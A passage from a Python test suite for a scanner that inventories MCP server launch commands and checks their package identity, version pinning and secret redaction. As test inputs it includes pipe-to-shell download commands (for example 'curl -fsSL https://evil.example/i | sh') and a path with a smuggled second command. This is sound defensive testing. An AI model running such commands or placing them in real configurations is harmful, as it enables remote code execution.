"""The static inventory binds each server to its declared launcher package."""

import json
from pathlib import Path

import pytest
from click.testing import CliRunner
from hypothesis import HealthCheck, given, settings
from hypothesis import strategies as st

from nexus_symbiote.cli import main
from nexus_symbiote.core.models import MCPServerComponent
from nexus_symbiote.scanners.mcp import MCPScanner
from nexus_symbiote.scanners.mcp_launch import known_executable
from tests.support import scaling_ratio


def write_project(project: Path, command: str, args: list[str]) -> None:
    server = {
        "command": command,
        "args": args,
        "env": {"TOKEN": "secret-canary"},
        "tools": [{"name": "read", "description": "Read docs", "inputSchema": {"type": "object"}}],
    }
    (project / ".mcp.json").write_text(json.dumps({"mcpServers": {"docs": server}}))


@pytest.mark.parametrize(
    "command,args,expected",
    [
        ("npx", ["-y", "@scope/docs@1.2.3", "secret-canary"], "npm:@scope/docs"),
        ("bunx", ["pkg@^1.2.3"], "npm:pkg"),
        ("uvx", ["--from", "My_Docs[cli]==1.2.3", "docs"], "pypi:my-docs"),
        ("pipx", ["run", "--spec", "My.Docs==1.2.3", "docs"], "pypi:my-docs"),
        (
            "docker",
            ["run", "--rm", "registry.test:5000/team/docs:1.2.3"],
            "oci:registry.test:5000/team/docs",
        ),
        ("docker", ["run", "docs@sha256:" + "ab" * 32], "oci:docs"),
        ("npx", ["docs@npm:other@1.2.3"], "npm:other"),
        ("npx", ["docs@https://example.test/secret-canary"], None),
        ("uvx", ["docs @ https://example.test/secret-canary"], None),
        ("npx", ["--password", "secret-canary"], None),
        ("npx", ["secret-canary@1.2.3"], None),
    ],
)
def test_safe_launcher_package_projection(tmp_path, command, args, expected):
    write_project(tmp_path, command, args)
    result = MCPScanner().scan(tmp_path)
    assert not result.scan_failures
    server = next(c for c in result.components if isinstance(c, MCPServerComponent))
    assert server.launcher_package == expected
    assert "secret-canary" not in server.model_dump_json()
    assert server.args == ["***"] * len(args)


def test_cli_rejects_substituted_missing_and_legacy_package_identity(tmp_path):
    project = tmp_path / "project"
    project.mkdir()
    runner = CliRunner()

    def scan(filename, target):
        path = tmp_path / filename
        write_project(project, "npx", [target])
        result = runner.invoke(main, ["scan", str(project), "--no-project-policy", "-o", str(path)])
        assert result.exit_code == 0, result.output
        return path

    def validate(bom, expected):
        result = runner.invoke(
            main, ["validate", str(bom), "--project", str(project), "--no-project-policy"]
        )
        assert result.exit_code == expected, result.output

    def diff(old, new):
        result = runner.invoke(
            main, ["diff", str(old), str(new), "--json-output", "--fail-on-alert"]
        )
        assert result.exit_code == 1, result.output
        alerts = json.loads(result.output)["security_alerts"]
        assert any(a["severity"] == "critical" and "launcher package" in a["alert"] for a in alerts)

    original = scan("reviewed.json", "reviewed-docs@1.2.3")
    validate(original, 0)

    legacy = tmp_path / "legacy.json"
    document = json.loads(original.read_text())
    server = next(c for c in document["components"] if "launcher_package" in c)
    del server["launcher_package"]
    legacy.write_text(json.dumps(document))
    validate(legacy, 1)
    diff(legacy, original)

    candidate = scan("candidate.json", "replacement-docs@1.2.3")
    validate(candidate, 0)
    validate(original, 1)
    diff(original, candidate)

    opaque = scan("opaque.json", "reviewed-docs@npm:replacement-docs@1.2.3")
    validate(original, 1)
    diff(original, opaque)


def scan_server(project: Path, server: dict) -> MCPServerComponent:
    (project / ".mcp.json").write_text(json.dumps({"mcpServers": {"docs": server}}))
    result = MCPScanner().scan(project)
    assert not result.scan_failures
    return next(c for c in result.components if isinstance(c, MCPServerComponent))


@pytest.mark.parametrize("option", ["-n", "--node-arg", "--npm"])
def test_npx_options_that_take_a_value_cannot_present_a_decoy_package(tmp_path, option):
    # npx removes these options with the word after them, so the second word is the package.
    server = scan_server(
        tmp_path, {"command": "npx", "args": [option, "left-pad@1.3.0", "evil-server"]}
    )
    assert server.launcher_package == "npm:evil-server"
    assert server.version_pinned is False
    assert "left-pad" not in server.model_dump_json()
    assert any(risk.category == "version_pinning" for risk in server.risks)


def test_yarnpkg_is_the_yarn_runner_not_a_local_program(tmp_path):
    (tmp_path / ".mcp.json").write_text(
        json.dumps({"mcpServers": {"docs": {"command": "yarnpkg", "args": ["dlx", "evil"]}}})
    )
    result = MCPScanner().scan(tmp_path)
    server = next(c for c in result.components if isinstance(c, MCPServerComponent))
    yarn = scan_server(tmp_path, {"command": "yarn", "args": ["dlx", "evil"]})
    assert server.launcher_package == yarn.launcher_package == "npm:evil"
    assert server.version_pinned is False
    assert [r.category for r in server.risks] == [r.category for r in yarn.risks]


def test_a_bare_deno_lock_option_before_the_script_is_a_gap(tmp_path):
    # Deno may read the next word as the lock file and run the word after it.
    (tmp_path / ".mcp.json").write_text(
        json.dumps(
            {
                "mcpServers": {
                    "docs": {
                        "command": "deno",
                        "args": ["run", "--lock", "npm:left-pad@1.3.0", "npm:evil-server"],
                    }
                }
            }
        )
    )
    result = MCPScanner().scan(tmp_path)
    server = next(c for c in result.components if isinstance(c, MCPServerComponent))
    assert server.launcher_package is None
    assert server.version_pinned is not True
    assert result.surfaces_excluded
    pinned = scan_server(
        tmp_path, {"command": "deno", "args": ["run", "--lock=deno.lock", "npm:left-pad@1.3.0"]}
    )
    assert pinned.launcher_package == "npm:left-pad"
    assert pinned.version_pinned is True


def test_short_environment_flags_do_not_discard_launcher_identity(tmp_path):
    server = scan_server(
        tmp_path,
        {"command": "npx", "args": ["-y", "mcp-1@1.2.3"], "env": {"MODE": "m", "DEBUG": "1"}},
    )
    assert server.launcher_package == "npm:mcp-1"


def test_credential_inside_package_name_withholds_launcher_identity(tmp_path):
    server = scan_server(
        tmp_path,
        {"command": "npx", "args": ["-y", "docs-k8x2v9q4zt"], "env": {"TOKEN": "k8x2v9q4zt"}},
    )
    assert server.launcher_package is None
    assert "k8x2v9q4zt" not in server.model_dump_json()


@pytest.mark.parametrize(
    "command,args",
    [
        ("npx", ["-y", "docs@."]),
        ("npx", ["-y", "docs@.."]),
        ("npx", ["-y", "docs.tgz"]),
        ("npx", ["-y", "docs@release.TAR.GZ"]),
        ("uvx", ["--from", "docs==1.2.3", "--index-url", "https://mirror.test/simple", "docs"]),
        ("uvx", ["--from", "docs==1.2.3", "--find-links=/opt/wheels", "docs"]),
        ("pipx", ["run", "--spec", "docs==1.2.3", "--index-url", "https://mirror.test", "docs"]),
    ],
)
def test_local_or_alternate_index_launchers_have_no_registry_identity(tmp_path, command, args):
    assert scan_server(tmp_path, {"command": command, "args": args}).launcher_package is None


@pytest.mark.parametrize(
    "before,after",
    [
        (
            {"command": "npx", "args": ["-y", "docs@1.2.3"], "env": {"BASE": "https://a.test"}},
            {"command": "npx", "args": ["-y", "docs@1.2.3"], "env": {"BASE": "https://b.test"}},
        ),
        ({"url": "https://mcp.test/safe/sse"}, {"url": "https://mcp.test/other/sse"}),
    ],
)
def test_drift_gate_reports_redacted_source_changes_as_critical(
    tmp_path, monkeypatch, before, after
):
    monkeypatch.setenv("NEXUS_SYMBIOTE_SOURCE_BINDING_KEY", "k" * 40)
    project = tmp_path / "project"
    project.mkdir()
    runner = CliRunner()
    snapshots = []
    for index, server in enumerate([before, after]):
        (project / ".mcp.json").write_text(json.dumps({"mcpServers": {"docs": server}}))
        path = tmp_path / f"snapshot-{index}.json"
        run = runner.invoke(
            main, ["scan", str(project), "--report-only", "-f", "json", "-o", str(path)]
        )
        assert run.exit_code == 0, run.output
        snapshots.append(str(path))
    run = runner.invoke(main, ["diff", *snapshots, "--json-output", "--fail-on-alert"])
    assert run.exit_code == 1, run.output
    alerts = json.loads(run.stdout)["security_alerts"]
    assert any(
        alert["severity"] == "critical" and "static source binding changed" in alert["alert"]
        for alert in alerts
    ), alerts


GITHUB_DOCKER = ["run", "-i", "--rm", "-e", "GITHUB_PERSONAL_ACCESS_TOKEN"]


@pytest.mark.parametrize(
    "command,args,identity,pinned",
    [
        # Forms from client and server documentation that 0.1.0 left opaque.
        (
            "docker",
            [*GITHUB_DOCKER, "ghcr.io/github/github-mcp-server"],
            "oci:ghcr.io/github/github-mcp-server",
            False,
        ),
        (
            "docker",
            [*GITHUB_DOCKER, "ghcr.io/github/github-mcp-server@sha256:" + "a" * 64],
            "oci:ghcr.io/github/github-mcp-server",
            True,
        ),
        (
            "docker",
            ["container", "run", "-it", "--rm", "-eTOKEN=x", "img@sha256:" + "b" * 64],
            "oci:img",
            True,
        ),
        ("podman", ["run", "-i", "--rm", "--network", "none", "img:latest"], "oci:img", False),
        ("cmd", ["/c", "npx", "-y", "pkg@latest"], "npm:pkg", False),
        ("cmd", ["/c", "npx -y pkg@1.2.3"], "npm:pkg", True),
        ("/usr/local/bin/npx", ["-y", "pkg"], "npm:pkg", False),
        ("C:\\Program Files\\nodejs\\NPX.CMD", ["-y", "pkg@1.2.3"], "npm:pkg", True),
        ("sh", ["-c", "npx -y pkg@1.2.3"], "npm:pkg", True),
        ("bash", ["-lc", "exec npx -y pkg@latest"], "npm:pkg", False),
        ("env", ["NODE_ENV=production", "npx", "-y", "pkg@1.2.3"], "npm:pkg", True),
        ("op", ["run", "--", "npx", "-y", "pkg@1.2.3"], "npm:pkg", True),
        ("wsl", ["-e", "npx", "-y", "pkg@latest"], "npm:pkg", False),
        ("npx", ["-y", "--quiet", "pkg@latest"], "npm:pkg", False),
        ("npx", ["-y", "--package=@scope/pkg@latest", "pkg-bin"], "npm:@scope/pkg", False),
        ("npx", ["-p", "@scope/pkg@1.2.3", "pkg-bin", "--token", "x"], "npm:@scope/pkg", True),
        ("npm", ["exec", "--", "pkg@1.2.3"], "npm:pkg", True),
        ("pnpm", ["dlx", "pkg@1.2.3"], "npm:pkg", True),
        ("yarn", ["dlx", "-p", "pkg@latest", "pkg-bin"], "npm:pkg", False),
        ("bun", ["x", "pkg@1.2.3"], "npm:pkg", True),
        ("bunx", ["--bun", "pkg"], "npm:pkg", False),
        ("uvx", ["--python", "3.12", "pkg==1.2.3"], "pypi:pkg", True),
        ("uv", ["tool", "run", "--from", "pkg[cli]==1.2.3", "pkg"], "pypi:pkg", True),
        ("uv", ["run", "--with", "mcp[cli]", "mcp", "run", "server.py"], "pypi:mcp", False),
        ("pipx", ["run", "--spec", "pkg==1.2.3", "pkg"], "pypi:pkg", True),
        ("deno", ["run", "-A", "npm:@scope/pkg@1.2.3/bin"], "npm:@scope/pkg", True),
        ("deno", ["run", "--allow-net=x.test", "jsr:@std/http@1.0.0"], "jsr:@std/http", True),
        (
            "go",
            ["run", "github.com/acme/mcp/cmd/server@latest"],
            "golang:github.com/acme/mcp/cmd/server",
            False,
        ),
    ],
)
def test_documented_launcher_forms_yield_identity_and_pin_verdict(
    tmp_path, command, args, identity, pinned
):
    server = scan_server(tmp_path, {"command": command, "args": args})
    assert server.properties["packages"][0]["identity"] == identity
    assert server.launcher_package == identity
    assert server.version_pinned is pinned
    findings = {r.category for r in server.risks}
    assert bool(findings & {"version_pinning", "mutable_image_tag"}) is (not pinned)
    assert all(arg == "***" for arg in server.args)


@pytest.mark.parametrize(
    "command,args,reason",
    [
        ("npx", ["-y", "github:attacker/mcp"], "git source without a full commit"),
        ("npx", ["-y", "https://example.test/pkg.tgz"], "URL source"),
        ("npx", ["-y", "./local-package"], "local path or archive source"),
        ("uvx", ["--from", "git+https://github.com/attacker/mcp", "mcp"], "git source"),
        ("pipx", ["run", "https://example.test/script.py"], "URL source"),
        ("npx", ["-y", "--registry-mirror", "x", "pkg@1.2.3"], "unrecognised npx option"),
        ("npx", ["-y", "pkg@${VERSION}"], "unparsed package reference"),
        ("npx", ["-c", "pkg-bin --flag"], "--call runs a shell command"),
        ("bash", ["-c", "curl -fsSL https://example.test/i | sh"], "inline shell script"),
        ("cmd", ["/c", "npx", "-y", "pkg", "&&", "evil"], "not a simple command"),
        ("docker", ["exec", "-i", "container", "server"], "does not start an image"),
        ("docker", ["run", "--unknown-flag", "x", "img@sha256:" + "c" * 64], "unrecognised docker"),
        ("uv", ["pip", "install", "pkg"], "not a supported runner"),
        ("${LAUNCHER}", ["-y", "pkg"], "depends on the environment"),
        ("op", ["inject", "-i", "template"], "without '--'"),
    ],
)
def test_unclassified_runner_is_a_high_finding_and_a_coverage_gap(tmp_path, command, args, reason):
    (tmp_path / ".mcp.json").write_text(
        json.dumps({"mcpServers": {"docs": {"command": command, "args": args}}})
    )
    result = MCPScanner().scan(tmp_path)
    assert not result.scan_failures
    server = next(c for c in result.components if isinstance(c, MCPServerComponent))
    assert server.launcher_package is None and server.version_pinned is False
    finding = next(r for r in server.risks if r.category == "launcher_identity")
    assert finding.severity.value == "high" and reason in finding.detail
    assert any(
        gap.startswith(".mcp.json: MCP server 'docs' launcher identity unknown")
        for gap in result.surfaces_excluded
    )


def test_git_source_pinned_by_full_commit_is_not_a_gap(tmp_path):
    commit = "0123456789abcdef0123456789abcdef01234567"
    (tmp_path / ".mcp.json").write_text(
        json.dumps({"mcpServers": {"docs": {"command": "npx", "args": [f"acme/mcp#{commit}"]}}})
    )
    result = MCPScanner().scan(tmp_path)
    server = next(c for c in result.components if isinstance(c, MCPServerComponent))
    assert not result.surfaces_excluded
    assert server.version_pinned is True and server.version == commit
    assert server.properties["packages"][0]["identity"] == "git:https://github.com"
    assert server.launcher_package is None


GIT = "git+https://github.com/acme/mcp.git"
COMMIT = "0123456789abcdef0123456789abcdef01234567"


@pytest.mark.parametrize(
    "command,args,pinned",
    [
        # pip and uv read the commit after "@" and the fragment only for egg= and subdirectory=.
        ("uvx", ["--from", f"{GIT}#{COMMIT}", "mcp"], False),
        ("pipx", ["run", "--spec", f"{GIT}#{COMMIT}", "mcp"], False),
        ("uvx", ["--from", f"mcp @ {GIT}#{COMMIT}", "mcp"], False),
        ("uvx", ["--from", f"{GIT}@{COMMIT}#subdirectory=server", "mcp"], True),
        ("uvx", ["--from", f"mcp @ {GIT}@{COMMIT}#egg=mcp", "mcp"], True),
        # npm reads the commit after "#".
        ("npx", [f"{GIT}#{COMMIT}"], True),
    ],
)
def test_git_commit_is_read_where_each_installer_reads_it(tmp_path, command, args, pinned):
    detail = gap_reason(tmp_path, {"command": command, "args": args})
    if pinned:
        server = scan_server(tmp_path, {"command": command, "args": args})
        assert detail is None and server.version_pinned is True and server.version == COMMIT
    else:
        assert detail is not None and "git source without a full commit" in detail


@pytest.mark.parametrize(
    "command,args",
    [("node", ["server.js"]), ("python", ["-m", "server"]), ("/opt/tools/my-server", [])],
)
def test_local_executables_are_recorded_without_a_gap(tmp_path, command, args):
    (tmp_path / ".mcp.json").write_text(
        json.dumps({"mcpServers": {"docs": {"command": command, "args": args}}})
    )
    result = MCPScanner().scan(tmp_path)
    server = next(c for c in result.components if isinstance(c, MCPServerComponent))
    assert not result.surfaces_excluded
    assert server.properties["launcher"] == "local"
    assert server.version_pinned is None
    assert server.command == command.rsplit("/", 1)[-1]


@pytest.mark.parametrize(
    "option", ["-e", "--env", "-v", "--volume", "--mount", "--name", "--network", "--label"]
)
def test_value_taking_container_options_never_become_the_image(tmp_path, option):
    canary = "opt-value-canary-9x"
    server = scan_server(
        tmp_path,
        {"command": "docker", "args": ["run", "--rm", option, canary, "img@sha256:" + "d" * 64]},
    )
    assert server.launcher_package == "oci:img" and server.version_pinned is True
    assert canary not in server.model_dump_json()


RUNNERS = ["npx", "bunx", "uvx", "pipx", "docker", "podman", "pnpm", "yarn", "deno", "uv", "go"]
# The sentinel is never a valid package, image or module name, so it may appear in
# the inventory only if an option value or an opaque argument leaked.
SENTINEL = "Opt_Value=Canary"
WORDS = st.sampled_from(
    [
        "run",
        "dlx",
        "x",
        "exec",
        "tool",
        "-y",
        "--rm",
        "-i",
        "-e",
        "--from",
        "--with",
        "--spec",
        "-p",
        "--package",
        "--registry",
        "--quiet",
        "--",
        "pkg",
        "pkg@1.2.3",
        "pkg@latest",
        "pkg==1.2.3",
        "img:1.2.3",
        "img@sha256:" + "e" * 64,
        "github:a/b",
        "./local",
        "https://example.test/x.tgz",
        "${VAR}",
        "-c",
        "--unknown",
        SENTINEL,
    ]
)
PIN_FINDINGS = {"version_pinning", "mutable_image_tag", "launcher_identity"}


@settings(max_examples=200, deadline=None, suppress_health_check=[HealthCheck.too_slow])
@given(command=st.sampled_from(RUNNERS), args=st.lists(WORDS, max_size=6))
def test_every_package_runner_yields_a_pin_verdict_or_a_gap(command, args):
    import tempfile

    with tempfile.TemporaryDirectory() as directory:
        root = Path(directory)
        (root / ".mcp.json").write_text(
            json.dumps({"mcpServers": {"s": {"command": command, "args": args}}})
        )
        result = MCPScanner().scan(root)
    server = next(c for c in result.components if isinstance(c, MCPServerComponent))
    categories = {risk.category for risk in server.risks}
    if server.version_pinned is False:
        assert categories & PIN_FINDINGS
    elif server.version_pinned is True:
        assert not categories & PIN_FINDINGS
    else:
        assert not server.properties.get("packages")
    if "launcher_identity" in categories:
        assert result.surfaces_excluded
    assert SENTINEL not in json.dumps(
        [component.model_dump(mode="json") for component in result.components]
    )
    assert SENTINEL not in json.dumps(result.surfaces_excluded + result.scan_failures)


@pytest.mark.parametrize(
    "command,args,shown",
    [
        ("uv", ["run", "--with", "mcp[cli]==1.2.0", "canary-tool-x9", "run", "s.py"], None),
        ("npx", ["-p", "pkg@1.2.3", "canary-bin-x9", "--flag"], None),
        ("uvx", ["--from", "pkg==1.2.3", "canary-entry-x9"], None),
        ("cmd", ["/c", "canary-local-x9", "--serve"], None),
        ("sh", ["-c", "python3 server.py"], "python3"),
        ("cmd", ["/c", "npx", "-y", "pkg@1.2.3"], "npx"),
    ],
)
def test_effective_command_from_arguments_is_exported_only_when_recognised(
    tmp_path, command, args, shown
):
    server = scan_server(tmp_path, {"command": command, "args": args})
    assert server.properties.get("launcher_command") == shown
    assert "canary" not in server.model_dump_json()


@pytest.mark.parametrize(
    "command,args,pinned",
    [
        ("uvx", ["--with", "extra-dep==2.0.0", "tool-pkg==1.2.3"], True),
        ("uvx", ["--with", "extra-dep", "tool-pkg==1.2.3"], False),
        ("uv", ["tool", "run", "--from", "tool-pkg==1.2.3", "--with", "extra-dep", "tool"], False),
    ],
)
def test_tool_package_stays_the_identity_when_dependencies_are_added(
    tmp_path, command, args, pinned
):
    server = scan_server(tmp_path, {"command": command, "args": args})
    assert server.launcher_package == "pypi:tool-pkg" and server.version == "1.2.3"
    assert [p["identity"] for p in server.properties["packages"]] == [
        "pypi:tool-pkg",
        "pypi:extra-dep",
    ]
    assert server.version_pinned is pinned
    assert server.package_url == "pkg:pypi/tool-pkg@1.2.3"
    assert any(r.category == "version_pinning" for r in server.risks) is (not pinned)


def gap_reason(project: Path, server: dict) -> str | None:
    """The launcher_identity reason of a single server, asserting finding and gap agree."""
    (project / ".mcp.json").write_text(json.dumps({"mcpServers": {"docs": server}}))
    result = MCPScanner().scan(project)
    assert not result.scan_failures
    record = next(c for c in result.components if isinstance(c, MCPServerComponent))
    finding = next((r for r in record.risks if r.category == "launcher_identity"), None)
    gaps = [g for g in result.surfaces_excluded if "launcher identity unknown" in g]
    assert bool(finding) is bool(gaps)
    if finding is None:
        return None
    assert finding.severity.value == "high" and record.version_pinned is False
    assert record.package_url is None
    return finding.detail


EVIL = ["npx", "-y", "evil-mcp@latest"]


@pytest.mark.parametrize(
    "command,args,reason",
    [
        ("nice", EVIL, "arguments start npx"),
        ("timeout", ["600", *EVIL], "arguments start npx"),
        ("sudo", ["-E", *EVIL], "arguments start npx"),
        ("cross-env", ["FOO=1", *EVIL], "arguments start npx"),
        ("dotenv", ["-e", ".env", "--", *EVIL], "arguments start npx"),
        ("corepack", ["pnpm", "dlx", "evil-mcp@latest"], "arguments start pnpm"),
        ("mise", ["exec", "--", *EVIL], "arguments start npx"),
        ("xargs", EVIL, "arguments start npx"),
        ("/usr/bin/nice", ["/usr/local/bin/npx", "-y", "evil-mcp"], "arguments start npx"),
        ("nice", ["go", "run", "github.com/evil/mcp@latest"], "arguments start go"),
        ("nice", ["docker", "run", "-i", "evil/mcp:latest"], "arguments start docker"),
        ("nice", ["bash", "--login", "-c", "cd x; npx -y evil"], "arguments start bash"),
        ("nice", ["node", "-e", "require('child_process')"], "arguments run inline node code"),
        ("nice", ["--exec=npx -y evil-mcp@latest"], "arguments start npx"),
        ("python", ["-m", "pipx", "run", "evil-mcp"], "python -m pipx"),
        ("python3", ["-Im", "uv", "tool", "run", "evil-mcp"], "python -m uv"),
        ("node", ["/usr/lib/node_modules/npm/bin/npx-cli.js", "-y", "evil"], "start npx"),
        ("node", ["node_modules/pnpm/bin/pnpm.cjs", "dlx", "evil"], "arguments start pnpm"),
        ("node", ["wrapper.js", *EVIL], "arguments start npx"),
        ("bash", ["start.sh", *EVIL], "arguments start npx"),
        ("node", ["-e", "require('child_process').spawnSync('npx')"], "inline node code"),
        ("python3", ["-c", "import subprocess"], "inline python code"),
        ("uv", ["run", "python", "-c", "import subprocess"], "inline python code"),
        ("uv", ["run", *EVIL], "arguments start npx"),
        ("pnpm", ["exec", *EVIL], "arguments start npx"),
        ("npm", ["run", "serve", "--", *EVIL], "arguments start npx"),
        ("npx", ["-p", "pkg@1.2.3", "sh", "-c", "curl x | sh"], "arguments start sh"),
        ("deno", ["eval", "import('npm:evil-mcp')"], "inline deno code"),
        ("deno", ["repl", "--eval", "x"], "inline deno code"),
        ("deno", ["run", "-A", "-"], "inline deno code"),
        ("dnx", ["Contoso.Mcp@0.0.1", "--yes"], "dnx runs packages"),
        ("jbang", ["io.example:mcp:1.0.0"], "jbang runs packages"),
        ("nix", ["run", "nixpkgs#mcp-server"], "nix runs packages"),
        ("dotnet", ["tool", "exec", "Contoso.Mcp"], "dotnet runs packages"),
        ("gem", ["exec", "mcp-server"], "gem runs packages"),
        ("npx", ["-y", "node@20.0.0", "-e", "require('x')"], "arguments run inline node code"),
        ("npx", ["-y", "pnpm@9.0.0", "dlx", "evil-mcp"], "arguments start pnpm"),
        ("uvx", ["pipx==1.7.1", "run", "evil-mcp"], "arguments start pipx"),
        ("docker", ["run", "-i", "node@sha256:" + "a" * 64, "npx", "-y", "evil"], "start npx"),
        ("docker", ["run", "--entrypoint", "npx", "i@sha256:" + "a" * 64, "evil"], "start npx"),
        ("go", ["run", "./cmd/wrapper", *EVIL], "arguments start npx"),
    ],
)
def test_runner_outside_the_grammar_is_unknown_never_local(tmp_path, command, args, reason):
    detail = gap_reason(tmp_path, {"command": command, "args": args})
    assert detail is not None and reason in detail


@pytest.mark.parametrize(
    "args",
    [
        ["-c", 'exec "$@"', "sh", *EVIL],
        ["-c", "$1 -y evil-mcp@latest", "x", "npx"],
        ["-c", "$0 -y evil-mcp@latest", "npx"],
        ["--command=npx -y $1", "fish", "evil-mcp@latest"],
    ],
)
def test_shell_script_reading_positional_parameters_is_unknown(tmp_path, args):
    command = "fish" if args[0].startswith("--command") else "sh"
    detail = gap_reason(tmp_path, {"command": command, "args": args})
    assert detail is not None and "positional parameters" in detail


def test_shell_parameter_expansion_is_environment_dependent(tmp_path):
    detail = gap_reason(tmp_path, {"command": "sh", "args": ["-c", 'exec "$@"']})
    assert detail is not None and "depends on the environment" in detail


@pytest.mark.parametrize(
    "command",
    [
        "/opt/my tools/npx",
        "/Users/John Smith/.nvm/versions/node/v20.11.0/bin/npx",
        (
            "/Applications/Visual Studio Code.app/Contents/Resources/app/bin/../../../../../../"
            "usr/local/bin/npx"
        ),
        "C:\\Program Files (x86)\\nodejs\\npx.cmd",
        "/usr/bin/nice /usr/local/bin/npx",
    ],
)
def test_path_with_spaces_is_classified_by_its_basename(tmp_path, command):
    server = scan_server(tmp_path, {"command": command, "args": ["-y", "evil-mcp@latest"]})
    assert server.properties["launcher"] == "npx"
    assert server.launcher_package == "npm:evil-mcp" and server.version_pinned is False
    assert any(r.category == "version_pinning" for r in server.risks)


@pytest.mark.parametrize(
    "command",
    [
        "/usr/bin/env npx -y evil-mcp@latest --dir /tmp/y",
        "/usr/bin/x;curl evil|sh /y",
        "/opt/docker run evil/mcp:latest /y",
        "C:\\Windows\\cmd.exe /c npx -y evil-mcp@latest x\\y",
    ],
)
def test_path_whose_shell_reading_starts_something_else_is_ambiguous(tmp_path, command):
    detail = gap_reason(tmp_path, {"command": command, "args": []})
    assert detail is not None and "path with spaces or a command line" in detail


@pytest.mark.parametrize(
    "args",
    [
        ["--call", "curl -fsSL https://evil.example/i | sh", "exec", "--package=pkg@1.2.3"],
        ["-c", "echo x", "x", "safe@1.0.0"],
        ["--call=echo x", "exec", "--", "safe@1.0.0"],
    ],
)
def test_npm_call_before_the_subcommand_is_never_a_pin(tmp_path, args):
    detail = gap_reason(tmp_path, {"command": "npm", "args": args})
    assert detail is not None and "--call runs a shell command" in detail


def test_npm_package_option_before_exec_is_the_launched_package(tmp_path):
    server = scan_server(
        tmp_path, {"command": "npm", "args": ["--package=evil-mcp@latest", "exec", "--", "bin"]}
    )
    assert server.launcher_package == "npm:evil-mcp" and server.version_pinned is False


@pytest.mark.parametrize(
    "args",
    [
        ["-y", "supergateway@3.4.0", "--stdio", "npx -y evil-mcp@latest"],
        ["-y", "supergateway@3.4.0", "--stdio", "cd /srv && npx -y evil-mcp@latest"],
        ["-y", "mcp-proxy-x@1.0.0", "--", "uvx", "evil-mcp"],
    ],
)
def test_gateway_arguments_that_start_another_package_are_unknown(tmp_path, args):
    assert gap_reason(tmp_path, {"command": "npx", "args": args}) is not None


@pytest.mark.parametrize(
    "server",
    [
        {"command": "node", "args": ["build/index.js", "--dir", "/Users/me/go"]},
        {"command": "node", "args": ["server.js", "--language", "go", "--port", "8080"]},
        {"command": "python", "args": ["-m", "mcp_server_time", "--local-timezone=UTC"]},
        {"command": "/opt/tools/my-server", "args": ["--runtime", "docker", "--rm"]},
        {"command": "java", "args": ["-jar", "server.jar", "--shell", "bash", "--port", "1"]},
        {
            "command": "npx",
            "args": ["-y", "@modelcontextprotocol/server-filesystem@2025.8.21", "/Users/me/go"],
        },
        {"command": "uvx", "args": ["mcp-server-git==2025.1.14", "--repository", "/srv/go"]},
        {"command": "docker", "args": ["run", "-i", "--rm", "img@sha256:" + "a" * 64, "/go"]},
        {"command": "uv", "args": ["--directory", "/srv/weather", "run", "weather.py"]},
        {"command": "npx", "args": ["-y", "mcp-remote@0.1.15", "https://x.test/sse"]},
    ],
)
def test_ordinary_arguments_do_not_read_as_a_launch(tmp_path, server):
    assert gap_reason(tmp_path, server) is None


WRAPPER_COMMANDS = st.one_of(
    st.sampled_from(
        ["nice", "timeout", "sudo", "cross-env", "/usr/bin/xargs", "my-wrapper", "node", "python3"]
    ),
    st.from_regex(r"[a-z][a-z0-9-]{0,12}", fullmatch=True).filter(
        lambda name: not known_executable(name)
    ),
)
FILLER = st.lists(st.sampled_from(["-E", "--", "600", "FOO=1", "--flag", "x.txt"]), max_size=3)
INVOCATIONS = st.sampled_from(
    [
        ["npx", "-y", "pkg@latest"],
        ["/usr/local/bin/npx", "pkg"],
        ["uvx", "pkg"],
        ["pnpm", "dlx", "pkg"],
        ["npm", "exec", "pkg"],
        ["docker", "run", "img:latest"],
        ["podman", "run", "img"],
        ["go", "run", "example.test/x@latest"],
        ["bash", "-c", "npx pkg"],
        ["cmd", "/c", "npx", "pkg"],
        ["env", "-S", "npx pkg"],
        ["node", "-e", "x"],
        ["python3", "-c", "x"],
        ["deno", "run", "npm:pkg"],
        ["dnx", "Pkg"],
        ["npx -y pkg@latest"],
    ]
)


@settings(max_examples=150, deadline=None, suppress_health_check=[HealthCheck.too_slow])
@given(command=WRAPPER_COMMANDS, before=FILLER, invocation=INVOCATIONS)
def test_a_runner_started_through_any_wrapper_is_never_silent(command, before, invocation):
    import tempfile

    with tempfile.TemporaryDirectory() as directory:
        root = Path(directory)
        server = {"command": command, "args": [*before, *invocation]}
        (root / ".mcp.json").write_text(json.dumps({"mcpServers": {"s": server}}))
        result = MCPScanner().scan(root)
    record = next(c for c in result.components if isinstance(c, MCPServerComponent))
    assert record.version_pinned is False
    assert any(r.category == "launcher_identity" for r in record.risks)
    assert any("launcher identity unknown" in gap for gap in result.surfaces_excluded)


# Second review: shells read every option word before the script, so options
# after -c do not make the next word the script.
@pytest.mark.parametrize(
    "command,args",
    [
        ("sh", ["-c", "--", "npx -y evil-mcp@latest"]),
        ("sh", ["-c", "-", "npx -y evil-mcp@latest"]),
        ("bash", ["-c", "-e", "exec npx -y evil-mcp@latest"]),
        ("sh", ["-c", "+x", "npx -y evil-mcp@latest"]),
        ("sh", ["-c", "-o", "pipefail", "npx -y evil-mcp@latest"]),
        ("bash", ["-co", "posix", "npx -y evil-mcp@latest"]),
        ("bash", ["-O", "extglob", "-c", "npx -y evil-mcp@latest"]),
        ("bash", ["--norc", "-c", "npx -y evil-mcp@latest"]),
        ("sh", ["+c", "npx -y evil-mcp@latest"]),
        ("fish", ["-lc", "npx -y evil-mcp@latest"]),
        ("fish", ["--comm", "npx -y evil-mcp@latest"]),
        ("cmd", ["/cnpx", "-y", "evil-mcp@latest"]),
        ("cmd", ["/cnpx -y evil-mcp@latest"]),
        ("cmd", ["/R", "npx", "-y", "evil-mcp@latest"]),
        ("cmd", ["/q/cnpx", "-y", "evil-mcp@latest"]),
        ("cmd.exe", ["/Q", "/C", "npx", "-y", "evil-mcp@latest"]),
    ],
)
def test_options_after_the_inline_switch_still_reach_the_script(tmp_path, command, args):
    server = scan_server(tmp_path, {"command": command, "args": args})
    assert server.properties["launcher"] == "npx"
    assert server.launcher_package == "npm:evil-mcp" and server.version_pinned is False
    assert any(r.category == "version_pinning" for r in server.risks)


@pytest.mark.parametrize(
    "command,args,reason",
    [
        ("bash", ["-oc", "errexit", "npx -y evil-mcp@latest"], "options before the script"),
        ("zsh", ["-c", "+", "-x", "npx -y evil-mcp@latest"], "options before the script"),
        ("dash", ["-O", "x", "-c", "npx -y evil-mcp@latest"], "options before the script"),
        # bash sources --rcfile even without -i when its standard input is a socket.
        ("bash", ["--rcfile", "x", "-c", "npx -y evil-mcp@latest"], "startup file"),
